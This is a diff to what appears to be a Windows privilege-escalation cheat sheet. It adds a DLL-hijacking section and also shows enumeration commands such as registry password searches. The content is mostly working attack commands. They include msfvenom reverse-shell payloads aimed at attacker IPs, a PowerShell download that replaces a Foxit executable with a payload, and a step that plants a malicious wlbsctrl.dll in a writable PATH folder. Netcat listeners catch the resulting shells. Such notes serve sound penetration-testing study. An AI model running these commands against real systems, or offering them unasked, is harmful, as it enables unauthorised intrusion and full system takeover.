@@ -11,6 +11,7 @@ net user Administrator
 net group "Domain Admins" 
 whoami /priv                         ..impersonate=juicy/printspoof
 reg query HKLM /f pass /t REG_SZ /s  ..pw search
+echo %path%                          ..could lead to dll hijack
 
 ================================== 
 Files
@@ -75,7 +76,7 @@ tasklist /v /fi "username eq system"
 tasklist /v | findstr /si "system admin"  
 tasklist /SVC
  
-sc query state= all   
+sc query state= all
 wmic service list brief  
 wmic product get name, version, vendor 
 wmic qfe get Caption, Description, HotFixID, InstalledOn 
@@ -279,8 +280,22 @@ msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 LHOST=192
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')" 
 shutdown -r -t 10 && exit 
 nc -nvlp 444
- 
- 
+
+================================== 
+DLL Hijack
+Example: Vista/Win8
+
+sc query IKEEXT          ..Want LocalSystem 
+c:> dir wlbsctrl.dll /s  ..Want Missing 
+echo %path%              ..Want Exploitable-Path 
+cacls "C:\Python27"      ..Want Authenticated Users (M) 
+accesssschk.exe -dqv "C:\Python27" 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.3 LPORT=445 -f dll > shell.dll  
+copy shell.dll C:\Python27\wlbsctrl.dll 
+shutdown -r -t 10 && exit   
+rlwrap nc -nvlp 445 
+
+
 ================================== 
 TOOLS 
  
